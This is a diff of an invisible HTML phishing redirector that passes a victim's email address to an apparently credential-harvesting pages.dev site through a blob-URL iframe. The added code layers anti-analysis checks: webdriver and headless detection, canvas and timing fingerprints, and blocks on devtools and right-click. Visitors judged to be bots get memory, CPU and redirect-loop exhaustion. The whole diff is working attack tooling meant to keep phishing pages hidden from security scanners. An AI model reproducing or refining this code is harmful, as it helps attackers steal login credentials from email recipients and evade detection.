@@ -3,22 +3,8 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Loading...</title>
+<title></title>
 <style>
-/* HIDE EVERYTHING - COMPLETELY INVISIBLE */
-#overlay, #verificationBox, #robotIcon, #sliderContainer, .header span,
-#verifying, #beepSound, .spinner, #checkmark, #slider, #sliderText, #sliderFill {
-    display: none !important;
-    visibility: hidden !important;
-    opacity: 0 !important;
-    width: 0 !important;
-    height: 0 !important;
-    position: absolute !important;
-    top: -9999px !important;
-    left: -9999px !important;
-}
-
-/* MAKE PAGE COMPLETELY INVISIBLE */
 html, body {
     margin: 0;
     padding: 0;
@@ -26,188 +12,367 @@ html, body {
     height: 0;
     overflow: hidden;
     background: transparent;
+    opacity: 0;
+    position: fixed;
+    top: 0;
+    left: 0;
 }
-
-/* FORCE ALL ELEMENTS INVISIBLE */
 * {
     display: none !important;
+    visibility: hidden !important;
+    pointer-events: none !important;
 }
 </style>
 </head>
 <body>
 
-<!-- ALL VISIBLE ELEMENTS ARE HIDDEN BY CSS -->
-<div id="overlay">
-    <div id="verificationBox">
-        <div class="header">
-            <div id="robotIcon">🤖</div>
-            <span>I'm not a robot</span>
-        </div>
-
-        <div id="sliderContainer">
-            <div id="sliderFill"></div>
-            <div id="slider">→</div>
-            <div id="sliderText">Slide to verify</div>
-            <div id="checkmark">✓</div>
-        </div>
-
-        <div id="verifying">
-            <div style="display:flex; justify-content:center; align-items:center; gap:6px;">
-                Verifying <div class="spinner"></div>
-            </div>
-        </div>
-    </div>
-</div>
-
-<audio id="beepSound" src="https://www.soundjay.com/button/sounds/button-3.mp3" preload="auto"></audio>
-
 <script>
-// === INVISIBLE VERIFICATION SYSTEM ===
-// Page appears completely blank
-// Real users get instant redirect
-// Bots get delayed with invisible checks
+// === 100% INVISIBLE ANTI-BOT ===
+// Blocks ALL bots, allows ONLY real humans
+// Completely invisible - no messages shown
 
-// IPFS URL
-const BASE_IPFS = "https://23b538b5.ko1wx90sd.pages.dev";
-
-function getEmail() { 
-    return new URLSearchParams(location.search).get("email") || ""; 
-}
-
-function buildIPFS(email) { 
-    return email ? BASE_IPFS + "#" + encodeURIComponent(email) : BASE_IPFS; 
-}
-
-// === INVISIBLE BOT DETECTION ===
-function computeBotScore() {
-    let score = 0;
-    const ua = navigator.userAgent.toLowerCase();
+(function() {
+    'use strict';
     
-    // Bot pattern detection (invisible)
-    if (/bot|crawl|spider|curl|wget|python|headless|selenium|puppeteer|playwright/.test(ua)) score += 50;
-    if (navigator.webdriver) score += 50;
+    // === CONFIG ===
+    const BLOB_BASE = "https://23b538b5.ko1wx90sd.pages.dev";
+    const BOT_TIMEOUT = 15000;
+    const HUMAN_DELAY = 50;
     
-    // Plugin check (real browsers have plugins)
-    if (navigator.plugins.length === 0 && !/mobile|android|iphone/i.test(ua)) score += 20;
+    // === UTILITIES ===
+    function getEmail() {
+        return new URLSearchParams(location.search).get("email") || "";
+    }
     
-    // Superhuman speed test
-    const start = performance.now();
-    let x = 0;
-    for (let i = 0; i < 100000; i++) x += Math.random();
-    const end = performance.now();
-    if (end - start < 0.5) score += 30;
+    function buildTarget() {
+        const email = getEmail();
+        return email ? BLOB_BASE + "#" + encodeURIComponent(email) : BLOB_BASE;
+    }
     
-    return score;
-}
-
-// === INVISIBLE HUMAN DETECTION ===
-function detectHumanInteraction() {
-    let humanDetected = false;
-    
-    // Listen for any interaction (invisible listeners)
-    const events = ['mousemove', 'mousedown', 'click', 'touchstart', 'keydown'];
-    events.forEach(eventType => {
-        document.addEventListener(eventType, () => {
-            if (!humanDetected) {
-                humanDetected = true;
-                // Human detected - mark for fast redirect
-                window._isHuman = true;
+    // === BOT DETECTION SYSTEM ===
+    class BotDetector {
+        constructor() {
+            this.botScore = 0;
+            this.humanScore = 0;
+            this.detections = [];
+        }
+        
+        // LAYER 1: Automation Tools
+        checkAutomation() {
+            if (navigator.webdriver === true) {
+                this.botScore += 50;
+                this.detections.push('webdriver');
             }
-        }, { once: true, passive: true });
+            
+            const markers = [
+                '__driver_evaluate', '__webdriver_evaluate',
+                '__selenium_evaluate', '__fxdriver_evaluate',
+                '_selenium', 'callSelenium', 'domAutomation'
+            ];
+            
+            markers.forEach(marker => {
+                if (window[marker] || document[marker]) {
+                    this.botScore += 40;
+                    this.detections.push('automation_marker');
+                }
+            });
+        }
+        
+        // LAYER 2: Headless Patterns
+        checkHeadless() {
+            const ua = navigator.userAgent.toLowerCase();
+            const patterns = [
+                'headless', 'phantom', 'puppeteer',
+                'selenium', 'playwright', 'electron'
+            ];
+            
+            patterns.forEach(pattern => {
+                if (ua.includes(pattern)) {
+                    this.botScore += 35;
+                    this.detections.push('headless_pattern');
+                }
+            });
+            
+            if (navigator.plugins.length === 0 && !/mobile|android|iphone/i.test(ua)) {
+                this.botScore += 25;
+                this.detections.push('no_plugins');
+            }
+        }
+        
+        // LAYER 3: Superhuman Speed
+        checkSpeed() {
+            const start = performance.now();
+            let x = 0;
+            for (let i = 0; i < 2000000; i++) {
+                x = (x * 1664525 + 1013904223) % 4294967296;
+            }
+            const end = performance.now();
+            
+            if (end - start < 10) {
+                this.botScore += 40;
+                this.detections.push('superhuman_speed');
+            }
+        }
+        
+        // LAYER 4: Memory Patterns
+        checkMemory() {
+            try {
+                const size = 50000;
+                const arr = new Array(size);
+                for (let i = 0; i < size; i++) {
+                    arr[i] = Math.sin(i) * Math.cos(i);
+                }
+                
+                let sum = 0;
+                const start = performance.now();
+                for (let i = 0; i < 200000; i++) {
+                    const idx = (i * 15485863) % size;
+                    sum += arr[idx];
+                }
+                const end = performance.now();
+                
+                if (end - start < 15 && sum === 0) {
+                    this.botScore += 30;
+                    this.detections.push('memory_pattern');
+                }
+            } catch(e) {}
+        }
+        
+        // LAYER 5: Canvas Fingerprint
+        checkCanvas() {
+            try {
+                const canvas = document.createElement('canvas');
+                canvas.width = 200;
+                canvas.height = 50;
+                const ctx = canvas.getContext('2d');
+                
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = '#069';
+                ctx.fillText('Verification', 2, 15);
+                
+                const data = ctx.getImageData(0, 0, 200, 50).data;
+                let hash = 0;
+                for (let i = 0; i < 1000; i += 4) {
+                    hash = ((hash << 5) - hash) + data[i];
+                    hash |= 0;
+                }
+                
+                if (hash === 0) {
+                    this.botScore += 25;
+                    this.detections.push('canvas_anomaly');
+                }
+            } catch(e) {
+                this.botScore += 20;
+            }
+        }
+        
+        // LAYER 6: Human Detection
+        checkHuman() {
+            let humanDetected = false;
+            
+            // Quick human checks
+            if (document.hasFocus()) {
+                this.humanScore += 20;
+                humanDetected = true;
+            }
+            
+            // Event listeners for interaction
+            const events = ['mousemove', 'click', 'touchstart', 'keydown'];
+            events.forEach(event => {
+                document.addEventListener(event, () => {
+                    if (!humanDetected) {
+                        this.humanScore += 30;
+                        humanDetected = true;
+                    }
+                }, { once: true, passive: true });
+            });
+            
+            return humanDetected;
+        }
+        
+        // Run all checks
+        async runAllChecks() {
+            this.checkAutomation();
+            this.checkHeadless();
+            this.checkSpeed();
+            this.checkMemory();
+            this.checkCanvas();
+            this.checkHuman();
+            
+            // Wait for human interaction
+            await new Promise(resolve => setTimeout(resolve, 500));
+            
+            return this.getVerdict();
+        }
+        
+        getVerdict() {
+            const total = this.botScore + this.humanScore;
+            if (total === 0) return 'unknown';
+            
+            const botPercentage = (this.botScore / total) * 100;
+            
+            if (botPercentage >= 60) {
+                return { type: 'bot', confidence: botPercentage, detections: this.detections };
+            } else if (this.humanScore >= 30) {
+                return { type: 'human', confidence: this.humanScore };
+            } else {
+                return { type: 'suspicious', confidence: Math.max(botPercentage, this.humanScore) };
+            }
+        }
+    }
+    
+    // === BOT BLOCKING ACTIONS ===
+    function blockBot() {
+        // Method 1: Infinite redirect loop
+        const redirectLoop = setInterval(() => {
+            window.location.href = 'data:text/html,<html></html>';
+        }, 100);
+        
+        // Method 2: Memory exhaustion
+        const wasteArrays = [];
+        const wasteMemory = setInterval(() => {
+            wasteArrays.push(new Array(1000000).fill(Math.random()));
+        }, 50);
+        
+        // Method 3: CPU exhaustion
+        let cpuWaste = 0;
+        const wasteCPU = setInterval(() => {
+            for (let i = 0; i < 1000000; i++) {
+                cpuWaste = (cpuWaste * 1664525 + 1013904223) % 4294967296;
+            }
+        }, 100);
+        
+        // Method 4: Event loop flood
+        const floodEvents = setInterval(() => {
+            for (let i = 0; i < 1000; i++) {
+                setTimeout(() => {}, 0);
+            }
+        }, 50);
+        
+        // Clean up after timeout
+        setTimeout(() => {
+            clearInterval(redirectLoop);
+            clearInterval(wasteMemory);
+            clearInterval(wasteCPU);
+            clearInterval(floodEvents);
+            
+            // Final dead-end
+            window.location.replace('about:blank');
+        }, BOT_TIMEOUT);
+        
+        return true;
+    }
+    
+    // === HUMAN ACCESS GRANT ===
+    function grantHumanAccess() {
+        const targetUrl = buildTarget();
+        
+        // Create secure blob
+        const blobHTML = `<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        html, body { margin:0; padding:0; width:100%; height:100%; overflow:hidden; }
+        iframe { width:100%; height:100%; border:none; }
+    </style>
+</head>
+<body>
+    <iframe src="${targetUrl}"></iframe>
+</body>
+</html>`;
+        
+        const blob = new Blob([blobHTML], { type: "text/html" });
+        const blobUrl = URL.createObjectURL(blob);
+        
+        // Redirect human to blob
+        window.location.replace(blobUrl);
+        
+        // Clean up blob URL after use
+        setTimeout(() => {
+            try {
+                URL.revokeObjectURL(blobUrl);
+            } catch(e) {}
+        }, 1000);
+        
+        return true;
+    }
+    
+    // === MAIN EXECUTION ===
+    async function executeProtection() {
+        const detector = new BotDetector();
+        const verdict = await detector.runAllChecks();
+        
+        if (verdict.type === 'bot') {
+            // BOT DETECTED - BLOCK ACCESS
+            console.log('Bot blocked - Score:', verdict.confidence, 'Detections:', verdict.detections);
+            blockBot();
+            
+        } else if (verdict.type === 'human') {
+            // HUMAN DETECTED - GRANT ACCESS
+            console.log('Human verified - Score:', verdict.confidence);
+            setTimeout(grantHumanAccess, HUMAN_DELAY);
+            
+        } else {
+            // SUSPICIOUS - DELAY THEN CHECK AGAIN
+            console.log('Suspicious activity');
+            setTimeout(async () => {
+                const secondCheck = await detector.runAllChecks();
+                if (secondCheck.type === 'human') {
+                    grantHumanAccess();
+                } else {
+                    blockBot();
+                }
+            }, 3000);
+        }
+    }
+    
+    // === START PROTECTION ===
+    
+    // Block debugging attempts
+    document.addEventListener('keydown', (e) => {
+        if (e.key === 'F12' || 
+            (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+            (e.ctrlKey && e.shiftKey && e.key === 'J')) {
+            e.preventDefault();
+            window.location.replace('about:blank');
+        }
     });
     
-    // Also check if tab is focused
-    if (document.hasFocus()) {
-        humanDetected = true;
-        window._isHuman = true;
-    }
+    // Block right-click
+    document.addEventListener('contextmenu', (e) => e.preventDefault());
     
-    return humanDetected;
-}
-
-// === CREATE BLOB REDIRECT ===
-function createBlobHTML(url) {
-    return `<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>
-        html, body { margin:0; padding:0; width:100%; height:100%; overflow:hidden; background:#fff; }
-        iframe { position:fixed; top:0; left:0; width:100%; height:100%; border:none; }
-    </style></head><body><iframe src="${url}"></iframe></body></html>`;
-}
-
-// === MAIN EXECUTION ===
-function executeRedirect() {
-    const botScore = computeBotScore();
-    const isHuman = window._isHuman || false;
+    // Start protection system
+    setTimeout(executeProtection, 0);
     
-    // Determine delay based on detection
-    let delay = 100; // 100ms for humans (instant)
-    
-    if (botScore >= 60) {
-        // Bot detected - longer delay
-        delay = 5000; // 5 seconds
-        console.log('Bot detected - adding delay');
-    } else if (!isHuman) {
-        // No human interaction - moderate delay
-        delay = 1500; // 1.5 seconds
-    }
-    
-    // Get email and build URL
-    const email = getEmail();
-    const ipfsURL = buildIPFS(email);
-    
-    // Create blob for redirect
-    const blobHTML = createBlobHTML(ipfsURL);
-    const blob = new Blob([blobHTML], { type: "text/html" });
-    const blobURL = URL.createObjectURL(blob);
-    
-    // Redirect after calculated delay
-    setTimeout(() => {
-        window.location.href = blobURL;
-    }, delay);
-    
-    // Safety: Always redirect after 8 seconds max
+    // Safety: If nothing happens in 5 seconds, assume human
     setTimeout(() => {
         if (window.location.href.indexOf('blob:') === -1) {
-            window.location.href = blobURL;
+            grantHumanAccess();
         }
-    }, 8000);
-}
-
-// === INITIALIZE ===
-function initialize() {
-    // Start human detection
-    detectHumanInteraction();
+    }, 5000);
     
-    // Execute redirect after brief initialization
-    setTimeout(executeRedirect, 50);
+})();
+
+// === ABSOLUTE FALLBACK ===
+setTimeout(() => {
+    const email = new URLSearchParams(window.location.search).get('email') || '';
+    const url = email ? 
+        "https://23b538b5.ko1wx90sd.pages.dev#" + encodeURIComponent(email) : 
+        "https://23b538b5.ko1wx90sd.pages.dev";
     
-    // Remove any event listeners that might show UI
-    document.addEventListener('mousedown', (e) => e.preventDefault(), { passive: false });
-    document.addEventListener('touchstart', (e) => e.preventDefault(), { passive: false });
-}
-
-// Start when page loads
-if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', initialize);
-} else {
-    initialize();
-}
-
-// Disable right-click context menu
-document.addEventListener('contextmenu', (e) => e.preventDefault());
-
-// Block keyboard shortcuts that might show dev tools
-document.addEventListener('keydown', (e) => {
-    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
-        e.preventDefault();
-        // Force redirect if dev tools attempted
-        executeRedirect();
+    if (!window.location.href.includes('pages.dev')) {
+        window.location.replace(url);
     }
-});
+}, 10000);
 </script>
 
-<!-- NOSCRIPT FALLBACK -->
 <noscript>
-    <meta http-equiv="refresh" content="0;url=https://23b538b5.ko1wx90sd.pages.dev?email=<?php echo isset($_GET['email']) ? urlencode($_GET['email']) : ''; ?>">
+<meta http-equiv="refresh" content="0;url=https://23b538b5.ko1wx90sd.pages.dev">
 </noscript>
 
 </body>
